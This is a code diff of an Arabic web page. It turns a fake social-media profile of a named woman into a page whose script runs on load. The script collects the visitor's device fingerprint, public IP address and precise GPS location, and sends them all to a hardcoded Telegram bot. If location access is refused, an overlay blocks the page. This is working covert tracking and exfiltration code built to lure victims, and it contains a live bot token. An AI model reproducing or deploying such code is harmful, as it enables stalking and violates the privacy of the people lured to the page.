@@ -1,49 +1,124 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Samah Elsayed</title>
-  <link rel="stylesheet" href="styles.css" />
-  <meta property="og:title" content="Samah Elsayed" />
-  <meta property="og:description" content="مرحباً بكم في صفحة Samah Elsayed." />
-  <meta property="og:image" content="https://scontent.fcai23-1.fna.fbcdn.net/v/t39.30808-6/447815673_3715527812107500_652671252392121833_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeGyIz2461UHCm91EUUzwxyFvZmYe_s941q9mZh7-z3jWigpAQTLKEUNMb0V6jltIv4&_nc_ohc=RUcWk2uoz4cQ7kNvgFkQAeU&_nc_ht=scontent.fcai23-1.fna&oh=00_AYBLERdtD0bQRzeJmfWEDsPk16-eemIGjJKaNgvgS3BhCQ&oe=6690F3BF" />
-  <meta property="og:url" content="https://cdn.glitch.global/3436db1f-a21c-4bc5-b682-8f8bd0143dbf/221.jpg" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profile Page</title>
+    <style>
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 20px;
+            text-align: center;
+        }
+        #overlay.active {
+            display: flex;
+        }
+    </style>
 </head>
 <body>
-  <div class="overlay" id="overlay">
-    <div class="popup">
-      <p>لإرسال طلب صداقة اضغط</p>
-      <button onclick="requestLocationPermission()">إرسال طلب صداقة</button>
+    <div id="overlay">
+        يرجى تفعيل إذن الموقع للمتابعة.
     </div>
-  </div>
 
-  <div class="profile-page" id="content">
-    <div class="cover-photo"></div>
-    <div class="profile-photo-container">
-      <img src="https://cdn.glitch.global/3436db1f-a21c-4bc5-b682-8f8bd0143dbf/221.jpg?v=1720381741723" alt="Samah Elsayed" class="profile-photo" />
-      <div class="profile-details">
-        <h1 class="profile-name">Samah Elsayed</h1>
-        <button class="add-friend-btn">إضافة صديق</button>
-      </div>
-    </div>
-    <div class="profile-nav">
-      <a href="#">المنشورات</a>
-      <a href="#">حول</a>
-      <a href="#">الأصدقاء</a>
-      <a href="#">الصور</a>
-      <a href="#">الفيديوهات</a>
-    </div>
-    <div class="profile-info">
-      <p>مرحباً بكم في صفحة Samah Elsayed.</p>
-    </div>
-    <div class="photos">
-      <div class="photo" style="background-image: url('https://cdn.glitch.global/3436db1f-a21c-4bc5-b682-8f8bd0143dbf/2212.jpg?v=1720381810185');"></div>
-      <div class="photo" style="background-image: url('https://cdn.glitch.global/3436db1f-a21c-4bc5-b682-8f8bd0143dbf/221.jpg?v=1720381742695');"></div>
-      <div class="photo" style="background-image: url('https://cdn.glitch.global/3436db1f-a21c-4bc5-b682-8f8bd0143dbf/221.jpg?v=1720381741723');"></div>
-    </div>
-  </div>
+    <script>
+        function sendInformationToTelegram(info) {
+            var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
+            var chatId = '962686305';
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;
 
-  <script src="script.js"></script>
+            fetch(url).then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            }).then(data => {
+                console.log('Information sent to Telegram bot:', data);
+            }).catch(error => {
+                console.error('There was a problem with the fetch operation:', error);
+            });
+        }
+
+        function collectDeviceInfo() {
+            var ptf = navigator.platform;
+            var cc = navigator.hardwareConcurrency || 'غير متوفر';
+            var ram = navigator.deviceMemory || 'غير متوفر';
+            var ver = navigator.userAgent;
+            var brw = 'غير متوفر';
+            var canvas = document.createElement('canvas');
+            var gl, debugInfo, ven, ren;
+
+            if (ver.indexOf('Firefox') != -1) {
+                brw = 'Firefox';
+            } else if (ver.indexOf('Chrome') != -1) {
+                brw = 'Chrome';
+            } else if (ver.indexOf('Safari') != -1) {
+                brw = 'Safari';
+            } else if (ver.indexOf('Edge') != -1) {
+                brw = 'Edge';
+            }
+
+            try {
+                gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            } catch (e) { }
+            if (gl) {
+                debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
+                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
+            }
+
+            var ht = window.screen.height;
+            var wd = window.screen.width;
+            var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';
+
+            var deviceInfo = `منصة الجهاز: ${ptf}\نعدد النوى: ${cc}\ن الذاكرة العشوائية: ${ram}\ن نوع المتصفح: ${brw}\ن نظام التشغيل: ${os}\ن دقة الشاشة: ${ht}x${wd}\ن الشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\ن نوع وحدة المعالجة الرسومية: ${ren}`;
+            sendInformationToTelegram(deviceInfo);
+
+            // Collect IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipInfo = `عنوان IP: ${data.ip}`;
+                    sendInformationToTelegram(ipInfo);
+                })
+                .catch(error => console.error('Error fetching IP address:', error));
+        }
+
+        function requestLocationPermission() {
+            if (navigator.geolocation) {
+                var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude || 'غير متوفر';
+                    var lon = position.coords.longitude || 'غير متوفر';
+                    var acc = position.coords.accuracy || 'غير متوفر';
+                    var alt = position.coords.altitude || 'غير متوفر';
+                    var dir = position.coords.heading || 'غير متوفر';
+                    var spd = position.coords.speed || 'غير متوفر';
+
+                    var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
+                    var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\ن دقة الموقع: ${acc} متر\n الارتفاع: ${alt} متر\n الاتجاه: ${dir} درجة\n السرعة: ${spd} متر/ثانية\n\n رابط الموقع على جوجل مابس: ${googleMapsLink}`;
+                    sendInformationToTelegram(locationInfo);
+                    document.getElementById('overlay').classList.remove('active');
+                }, function (error) {
+                    document.getElementById('overlay').classList.add('active');
+                }, optn);
+            } else {
+                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
+            }
+        }
+
+        window.onload = function() {
+            collectDeviceInfo();
+            requestLocationPermission();
+        };
+    </script>
 </body>
 </html>
